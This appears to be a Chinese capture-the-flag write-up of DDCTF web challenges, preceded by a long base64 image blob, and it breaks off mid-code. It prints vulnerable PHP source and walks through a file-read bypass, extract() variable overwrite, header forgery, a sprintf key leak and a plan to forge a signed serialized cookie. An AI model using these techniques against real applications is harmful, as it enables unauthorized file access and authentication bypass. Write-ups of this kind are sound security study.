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&#39;&gt;&lt;/img&gt; 于是在思考是否可以构造index.php来读取源码 构造urlhttp://117.51.150.246/index.php?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3获取了index.php的源码 &lt;?php /* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */ error_reporting(E_ALL || ~E_NOTICE); header(&#39;content-type:text/html;charset=utf-8&#39;); if(! isset($_GET[&#39;jpg&#39;])) header(&#39;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;); $file = hex2bin(base64_decode(base64_decode($_GET[&#39;jpg&#39;]))); echo &#39;&lt;title&gt;&#39;.$_GET[&#39;jpg&#39;].&#39;&lt;/title&gt;&#39;; $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file); echo $file.&#39;&lt;/br&gt;&#39;; $file = str_replace(&quot;config&quot;,&quot;!&quot;, $file); echo $file.&#39;&lt;/br&gt;&#39;; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;/img&gt;&quot;; /* * Can you find the flag file? * */ ?&gt; 发现提示给了一篇博客地址和一个日期 让我们找到了这样的一篇文章 尝试了多次之后发现是 http://117.51.150.246/practice.txt.swp 发现了f1ag!ddctf.php于是想读取他的源码由于index页面做过限制,·file参数只能输入字母和数字,但是他将config替换为!于是构造f1agconfigddctf.php来进行绕过。base64解密就能得到源码 &lt;?php include(&#39;config.php&#39;); $k = &#39;hello&#39;; extract($_GET); if(isset($uid)) { $content=trim(file_get_contents($k)); if($uid==$content) { echo $flag; } else { echo&#39;hello&#39;; } } ?&gt; 审计一下 发现可以绕过 得到flag DDCTF{436f6e67726174756c6174696f6e73} web签到题打开页面发现没有登陆权限 查看源代码发现了index.js里面的内容 /** * Created by PhpStorm. * User: didi * Date: 2019/1/13 * Time: 9:05 PM */ function auth() { $.ajax({ type: &quot;post&quot;, url:&quot;http://117.51.158.44/app/Auth.php&quot;, contentType: &quot;application/json;charset=utf-8&quot;, dataType: &quot;json&quot;, beforeSend: function (XMLHttpRequest) { XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;); }, success: function (getdata) { console.log(getdata); if(getdata.data !== &#39;&#39;) { document.getElementById(&#39;auth&#39;).innerHTML = getdata.data; } },error:function(error){ console.log(error); } }); } 发现了app/Auth.php页面，而且发现了head头可以有didictf_username 尝试在app/Auth.php页面伪造header头didictf_username:admin 访问app/fL2XID2i0Cdh.php页面发现题目的源码 url:app/Application.php Class Application { var $path = &#39;&#39;; public function response($data, $errMsg = &#39;success&#39;) { $ret = [&#39;errMsg&#39; =&gt; $errMsg, &#39;data&#39; =&gt; $data]; $ret = json_encode($ret); header(&#39;Content-type: application/json&#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &#39;admin&#39;; if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) { $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;); return TRUE; }else{ $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace(&#39;../&#39;,&#39;&#39;,$path); $path=str_replace(&#39;..\\\\&#39;,&#39;&#39;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;); } exit(); } } url:app/Session.php include &#39;Application.php&#39;; class Session extends Application { //key建议为8位字符串 var $eancrykey = &#39;&#39;; var $cookie_expiration = 7200; var $cookie_name = &#39;ddctf_id&#39;; var $cookie_path = &#39;&#39;; var $cookie_domain = &#39;&#39;; var $cookie_secure = FALSE; var $activity = &quot;DiDiCTF&quot;; public function index() { if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &#39;DiDI Welcome you %s&#39;; $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]); parent::response($data,&#39;sucess&#39;); }else{ $this-&gt;session_create(); $data = &#39;DiDI Welcome you&#39;; parent::response($data,&#39;sucess&#39;); } } } private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&#39;../config/key.txt&#39;); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&#39;error&#39;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){ return FALSE; } if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;); } if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) { parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;); return FALSE; } if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) { parent::response(&#39;the user agent not match&#39;,&#39;error&#39;); return FALSE; } return TRUE; } private function session_create() { $sessionid = &#39;&#39;; while(strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)), &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;], &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;], &#39;user_data&#39; =&gt; &#39;&#39;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-&gt;index(); 其中发现了已一些危险函数unserialize，以及file_get_contents等等 这里存在类的反序列化应用 猜测flag可能藏在../config/key.txt里面 大概知道题目的大概流程为： 通过session反序列化 –&gt;创建Application对象–&gt; 控制path –&gt; getfalg $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&#39;error&#39;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;); return FALSE; } $session = unserialize($session); 细看代码，发现签名规则是md5(eancrykey+session)，也就是说，我们要想获得cookie控制权，必须得到eancrykey。通读代码，分析eancrykey出现地点。最终发现两个可疑点 eancrykey存放目录为../config/key.txt。 由于不在web目录且没有读文件的漏洞，此时攻击者不可获取。 某处代码中的调用 本地测试了一下 sprintf函数 &lt;?php $data=&quot;Welcome my friend %s&quot;; $arr=array(&#39;chuddy&#39;,&#39;chuddy123&#39;); foreach ($arr as $value) { echo sprintf($data,$value).&quot;&lt;br&gt;&quot;; } ?&gt; 输出结果为： Welcome my friend chuddy Welcome my friend chuddy123 于是想到构造方法：nickname=%s就可以得到eancrykey的值 然后就是伪造一个session值： private function sanitizepath($path) { $path = trim($path); $path=str_replace(&#39;../&#39;,&#39;&#39;,$path); 